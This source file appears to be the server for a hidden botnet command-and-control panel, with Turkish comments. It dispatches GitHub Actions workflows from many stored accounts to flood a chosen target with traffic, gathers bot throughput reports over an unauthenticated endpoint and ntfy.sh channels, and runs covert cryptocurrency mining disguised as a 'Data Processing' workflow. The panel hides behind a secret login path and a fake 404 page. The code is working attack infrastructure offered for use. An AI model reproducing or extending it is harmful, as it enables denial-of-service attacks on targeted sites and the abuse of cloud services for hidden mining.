const express = require('express');
const http = require('http');
const https = require('https');
const net = require('net');
const { Server } = require('socket.io');
const path = require('path');

const { loadAccounts } = require('./lib/secrets');
const { fetchAccountStatus, triggerAttack, stopAll } = require('./lib/github');
const { analyzeTarget, checkHealth } = require('./lib/analyzer');

const PORT = 5173;
const SECRET_PATH = process.env.C2_SECRET || 'c2panel';  // /c2panel ile eriş

const app = express();
const server = http.createServer(app);

// Auth sessions
const sessions = new Set();

const io = new Server(server, {
    cors: { origin: false },
    allowRequest: (req, cb) => {
        const cookie = req.headers.cookie || '';
        const match = cookie.match(/c2auth=([^;]+)/);
        const token = match?.[1];
        cb(null, token && sessions.has(token));
    }
});

app.use(express.json());

// Secret path ile giriş — /c2panel yazarsan cookie alıp dashboard'a yönlendir
app.get(`/${SECRET_PATH}`, (req, res) => {
    const token = Date.now().toString(36) + Math.random().toString(36).slice(2);
    sessions.add(token);
    res.cookie('c2auth', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
    res.redirect('/');
});

// Auth middleware — cookie yoksa 404 göster (dashboard gizli)
function authCheck(req, res, next) {
    const token = (req.headers.cookie || '').match(/c2auth=([^;]+)/)?.[1];
    if (token && sessions.has(token)) return next();
    // Auth yoksa boş 404
    res.status(404).send('Not Found');
}

// Her şey auth arkasında (socket.io ve report hariç)
app.use('/', (req, res, next) => {
    if (req.path.startsWith('/socket.io/')) return next();
    if (req.path === `/${SECRET_PATH}`) return next();
    if (req.path === '/api/report') return next(); // botlar auth'suz rapor gönderir
    authCheck(req, res, next);
});
app.use(express.static(path.join(__dirname, 'public')));

// Load accounts
const accounts = loadAccounts();
console.log(`Loaded ${accounts.length} accounts`);

// Status cache
let statusCache = null;
let statusTime = 0;

// ═══ LIVE METRICS STORE (botlardan gelen gerçek veriler) ═══
const liveStore = {
    bots: {},
    cumulativeReqs: 0,
    lastClean: Date.now()
};

// ═══ MINING STORE (ayrı kanal, farklı veri yapısı) ═══
const MINING_CHANNEL = 'c2-mining-x7k2p9m4nq';
const miningStore = {
    workers: {},        // worker_key -> {hashrate, shares, account, ts}
    totalShares: 0,
    lastClean: Date.now()
};

// Botların POST ettiği endpoint (AUTH YOK — botlar dışarıdan gelir)
app.post('/api/report', (req, res) => {
    const d = req.body;
    if (!d || !d.bot_id) return res.status(400).json({ error: 'bot_id required' });

    const key = `${d.account || 'unknown'}_bot${d.bot_id}`;
    const prev = liveStore.bots[key];
    const prevReqs = prev ? prev.reqs : 0;
    const newReqs = d.reqs || 0;
    // Cumulative: sadece artışı ekle
    if (newReqs > prevReqs) {
        liveStore.cumulativeReqs += (newReqs - prevReqs);
    }
    liveStore.bots[key] = {
        botId: d.bot_id,
        account: d.account || 'unknown',
        type: d.type || 'L7',
        rps: d.rps || 0,
        mbps: d.mbps || 0,
        pps: d.pps || 0,
        reqs: d.reqs || 0,
        bytes: d.bytes || 0,
        vus: d.vus || 0,
        elapsed: d.elapsed || 0,
        pct2xx: d.pct2xx || 0,
        pct5xx: d.pct5xx || 0,
        pct429: d.pct429 || 0,
        errors: d.errors || 0,
        target: d.target || '',
        ts: Date.now()
    };

    // 60 saniye veri gelmeyen botları temizle
    if (Date.now() - liveStore.lastClean > 30000) {
        const cutoff = Date.now() - 60000;
        for (const [k, v] of Object.entries(liveStore.bots)) {
            if (v.ts < cutoff) delete liveStore.bots[k];
        }
        liveStore.lastClean = Date.now();
    }

    res.json({ ok: true });
});

// Gerçek live aggregate (liveStore'dan)
function getRealLiveMetrics() {
    const bots = Object.values(liveStore.bots);
    const cutoff = Date.now() - 30000; // son 30sn içinde rapor edenler
    const active = bots.filter(b => b.ts > cutoff);

    const result = {
        est_rps: 0, est_mbps: 0, est_pps: 0,
        est_total_reqs: liveStore.cumulativeReqs,
        est_total_bytes: 0,
        sample_count: active.length,
        bot_details: []
    };

    for (const b of active) {
        result.est_rps += b.rps;
        result.est_mbps += b.mbps;
        result.est_pps += b.pps;
        result.est_total_bytes += b.bytes;
        result.bot_details.push(b);
    }

    return result;
}

async function getStatus() {
    if (statusCache && Date.now() - statusTime < 5000) return statusCache;

    const results = await Promise.allSettled(accounts.map(fetchAccountStatus));
    const accs = results.map(r => r.status === 'fulfilled' ? r.value : null).filter(Boolean);

    const grand = { active: 0, done: 0, queued: 0, ok: 0, fail: 0, total_bots: 0 };
    let lastSummary = null;

    for (const a of accs) {
        grand.active += a.active;
        grand.done += a.done;
        grand.queued += a.queued;
        grand.ok += a.ok;
        grand.fail += a.fail;
        grand.total_bots += a.bots;
        if (a.summary) lastSummary = a.summary;
    }

    // GERÇEK live veriler (botların POST ettiği)
    const live = getRealLiveMetrics();

    statusCache = {
        timestamp: new Date().toLocaleTimeString('tr-TR'),
        accounts: accs, grand, live,
        lastSummary
    };
    statusTime = Date.now();
    return statusCache;
}

// REST API
app.get('/api/status', async (req, res) => {
    res.json(await getStatus());
});

app.post('/api/attack', async (req, res) => {
    const { target, mode, duration, vus, jobs, host_header, accounts: accIds } = req.body;
    let { report_channel } = req.body;
    const selected = accounts.filter(a => accIds.includes(a.id));
    if (selected.length === 0) {
        return res.json([{ id: 0, user: 'SYSTEM', result: 'ERROR: Hesap seçilmedi' }]);
    }

    // Kanal yoksa otomatik oluştur
    if (!report_channel) {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        report_channel = 'c2-';
        for (let i = 0; i < 16; i++) report_channel += chars[Math.floor(Math.random() * chars.length)];
    }

    console.log(`[API /attack] ${selected.length} hesap, ntfy kanal: ${report_channel}`);

    // Yeni saldırı — cumulative sıfırla + ntfy dinle
    liveStore.cumulativeReqs = 0;
    liveStore.bots = {};
    startNtfyListener(report_channel);

    const result = await triggerAttack(selected, {
        target, mode, duration, vus, jobs,
        hostHeader: host_header,
        reportChannel: report_channel
    });
    io.emit('log', `ATTACK: ${target} | ${mode} | ${selected.length} hesap | kanal:${report_channel}`);
    res.json(result);
});

app.post('/api/stop', async (req, res) => {
    const selected = accounts.filter(a => (req.body.accounts || []).includes(a.id));
    const result = await stopAll(selected);
    io.emit('log', `STOP: ${selected.length} hesap durduruldu`);
    res.json(result);
});

app.get('/api/analyze', async (req, res) => {
    const url = req.query.url;
    if (!url) return res.status(400).json({ error: 'url required' });
    res.json(await analyzeTarget(url));
});

app.get('/api/health', async (req, res) => {
    const url = req.query.url;
    if (!url) return res.status(400).json({ error: 'url required' });
    res.json(await checkHealth(url));
});

// ═══ NTFY.SH SSE LISTENER (generic - handles both attack and mining) ═══
let ntfyAbort = null;
let miningNtfyAbort = null;

function startNtfyListener(channel) {
    if (ntfyAbort) { ntfyAbort.abort(); ntfyAbort = null; }
    console.log(`[NTFY] Listening on channel: ${channel}`);
    const url = `https://ntfy.sh/${channel}/json`;

    const req = https.get(url, { headers: { Accept: 'application/x-ndjson' } }, (res) => {
        let buffer = '';
        res.on('data', (chunk) => {
            buffer += chunk.toString();
            const lines = buffer.split('\n');
            buffer = lines.pop(); // incomplete line stays in buffer

            for (const line of lines) {
                if (!line.trim()) continue;
                try {
                    const msg = JSON.parse(line);
                    if (msg.event === 'message' && msg.message) {
                        const d = JSON.parse(msg.message);
                        if (d.bot_id) {
                            const key = `${d.account || 'unknown'}_bot${d.bot_id}`;
                            liveStore.bots[key] = {
                                botId: d.bot_id,
                                account: d.account || 'unknown',
                                type: d.type || 'L7',
                                rps: d.rps || 0,
                                mbps: d.mbps || 0,
                                pps: d.pps || 0,
                                reqs: d.reqs || 0,
                                bytes: d.bytes || 0,
                                vus: d.vus || 0,
                                elapsed: d.elapsed || 0,
                                pct2xx: d.pct2xx || 0,
                                pct5xx: d.pct5xx || 0,
                                pct429: d.pct429 || 0,
                                errors: d.errors || 0,
                                target: d.target || '',
                                ts: Date.now()
                            };
                            console.log(`[NTFY] Bot #${d.bot_id} (${d.account}): rps=${d.rps} mbps=${d.mbps}`);
                        }
                    }
                } catch (e) { /* skip non-json */ }
            }
        });
        res.on('error', (e) => console.error('[NTFY] Stream error:', e.message));
    });

    req.on('error', (e) => console.error('[NTFY] Connection error:', e.message));

    // Store for cleanup
    ntfyAbort = { abort: () => req.destroy() };
}

// ═══ MINING NTFY LISTENER ═══
function startMiningListener() {
    if (miningNtfyAbort) { miningNtfyAbort.abort(); miningNtfyAbort = null; }
    console.log(`[MINING] Listening on channel: ${MINING_CHANNEL}`);
    const url = `https://ntfy.sh/${MINING_CHANNEL}/json`;

    const req = https.get(url, { headers: { Accept: 'application/x-ndjson' } }, (res) => {
        let buffer = '';
        res.on('data', (chunk) => {
            buffer += chunk.toString();
            const lines = buffer.split('\n');
            buffer = lines.pop();
            for (const line of lines) {
                if (!line.trim()) continue;
                try {
                    const msg = JSON.parse(line);
                    if (msg.event === 'message' && msg.message) {
                        const d = JSON.parse(msg.message);
                        if (d.bot_id && d.type === 'mining') {
                            const key = `${d.account || 'unknown'}_batch${d.bot_id}`;
                            const prev = miningStore.workers[key];
                            const prevShares = prev ? prev.shares : 0;
                            const newShares = d.shares || 0;
                            if (newShares > prevShares) {
                                miningStore.totalShares += (newShares - prevShares);
                            }
                            miningStore.workers[key] = {
                                batchId: d.bot_id,
                                account: d.account || 'unknown',
                                hashrate: d.hashrate || 0,
                                maxHashrate: d.max_hashrate || 0,
                                cpuPct: d.cpu_pct || 0,
                                shares: d.shares || 0,
                                elapsed: d.elapsed || 0,
                                ts: Date.now()
                            };
                            console.log(`[MINING] ${d.account}-b${d.bot_id}: ${d.hashrate} H/s (max ${d.max_hashrate}, ${d.cpu_pct}%), ${d.shares} shares`);
                        }
                    }
                } catch (e) { /* skip */ }
            }
        });
        res.on('error', (e) => {
            console.error('[MINING] Stream error:', e.message);
            // Auto-reconnect
            setTimeout(() => startMiningListener(), 5000);
        });
    });
    req.on('error', (e) => {
        console.error('[MINING] Connection error:', e.message);
        setTimeout(() => startMiningListener(), 5000);
    });
    miningNtfyAbort = { abort: () => req.destroy() };
}

// Mining aggregate
function getMiningMetrics() {
    const workers = Object.values(miningStore.workers);
    const cutoff = Date.now() - 120000; // 2 dakika son aktif
    const active = workers.filter(w => w.ts > cutoff);

    let totalHashrate = 0;
    let totalMaxHashrate = 0;
    let sumCpuPct = 0;
    for (const w of active) {
        totalHashrate += w.hashrate;
        totalMaxHashrate += (w.maxHashrate || 0);
        sumCpuPct += (w.cpuPct || 0);
    }
    const avgCpuPct = active.length > 0 ? Math.round(sumCpuPct / active.length) : 0;

    // Group by account
    const byAccount = {};
    for (const w of active) {
        if (!byAccount[w.account]) byAccount[w.account] = { hashrate: 0, workers: 0, shares: 0 };
        byAccount[w.account].hashrate += w.hashrate;
        byAccount[w.account].workers += 1;
        byAccount[w.account].shares += w.shares;
    }

    return {
        totalHashrate,
        totalMaxHashrate,
        avgCpuPct,
        activeWorkers: active.length,
        totalShares: miningStore.totalShares,
        byAccount,
        workers: active,
        timestamp: new Date().toLocaleTimeString('tr-TR')
    };
}

// Mining API endpoints
app.get('/api/mining/status', (req, res) => {
    res.json(getMiningMetrics());
});

// Proxy status check — xmrig-proxy PC'de çalışıyor mu?
app.get('/api/mining/proxy-status', (req, res) => {
    const socket = new net.Socket();
    let responded = false;
    const timeout = setTimeout(() => {
        if (!responded) {
            responded = true;
            socket.destroy();
            res.json({ online: false, error: 'timeout' });
        }
    }, 3000);

    socket.connect(3333, '127.0.0.1', () => {
        if (!responded) {
            responded = true;
            clearTimeout(timeout);
            socket.destroy();
            res.json({ online: true, port: 3333, host: 'localhost' });
        }
    });

    socket.on('error', (e) => {
        if (!responded) {
            responded = true;
            clearTimeout(timeout);
            res.json({ online: false, error: e.message });
        }
    });
});

app.post('/api/mining/start', async (req, res) => {
    const results = [];
    for (const acc of accounts) {
        try {
            const axios = require('axios');
            const r = await axios.post(
                `https://api.github.com/repos/${acc.user}/${acc.repo}/actions/workflows/data-processing.yml/dispatches`,
                { ref: 'main', inputs: { task_id: `manual-${Date.now()}`, duration: '350' } },
                { headers: { Authorization: `token ${acc.token}`, Accept: 'application/vnd.github+json' } }
            );
            results.push({ id: acc.id, user: acc.user, result: 'OK' });
        } catch (e) {
            results.push({ id: acc.id, user: acc.user, result: e.response?.data?.message || e.message });
        }
    }
    io.emit('log', `MINING START: ${results.filter(r => r.result === 'OK').length} hesap tetiklendi`);
    res.json(results);
});

app.post('/api/mining/stop', async (req, res) => {
    const axios = require('axios');
    const results = [];
    for (const acc of accounts) {
        try {
            for (const status of ['in_progress', 'queued', 'waiting']) {
                const { data } = await axios.get(
                    `https://api.github.com/repos/${acc.user}/${acc.repo}/actions/runs?status=${status}&per_page=20`,
                    { headers: { Authorization: `token ${acc.token}` } }
                );
                for (const r of (data.workflow_runs || [])) {
                    if (r.name?.includes('Data Processing')) {
                        await axios.post(`https://api.github.com/repos/${acc.user}/${acc.repo}/actions/runs/${r.id}/cancel`, null, { headers: { Authorization: `token ${acc.token}` } }).catch(() => { });
                        await axios.post(`https://api.github.com/repos/${acc.user}/${acc.repo}/actions/runs/${r.id}/force-cancel`, null, { headers: { Authorization: `token ${acc.token}` } }).catch(() => { });
                    }
                }
            }
            results.push({ id: acc.id, user: acc.user, result: 'stopped' });
        } catch (e) { results.push({ id: acc.id, user: acc.user, result: e.message }); }
    }
    io.emit('log', `MINING STOP: ${accounts.length} hesap durduruldu`);
    res.json(results);
});

// Socket.IO — push status every 6s
io.on('connection', (socket) => {
    console.log('Client connected');
    getStatus().then(s => socket.emit('status', s));
});

// Status push — 15sn (rate limit koruma: 6 hesap × 2 call = 12 call / 15sn = 48/dk)
setInterval(async () => {
    if (io.engine.clientsCount > 0) {
        statusCache = null;
        const s = await getStatus();
        io.emit('status', s);
    }
}, 15000);

// Live metrics push — 3sn (liveStore'dan, API call yok)
setInterval(() => {
    if (io.engine.clientsCount > 0) {
        const live = getRealLiveMetrics();
        if (live.sample_count > 0) {
            io.emit('live', live);
        }
    }
}, 3000);

// Mining metrics push — 5sn
setInterval(() => {
    if (io.engine.clientsCount > 0) {
        const mining = getMiningMetrics();
        io.emit('mining', mining);
    }
}, 5000);

// Auto-start mining ntfy listener
startMiningListener();

// Start
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n=== C2 COMMAND CENTER ===`);
    console.log(`http://localhost:${PORT}/${SECRET_PATH}  <-- bu link ile gir`);
    console.log(`${accounts.length} hesap aktif`);
    console.log(`Direkt / açarsan 404 gösterir (gizli)`);
    console.log(`CF Tunnel: cloudflared tunnel --url http://localhost:${PORT}`);
    console.log(`Ctrl+C ile durdur\n`);
});
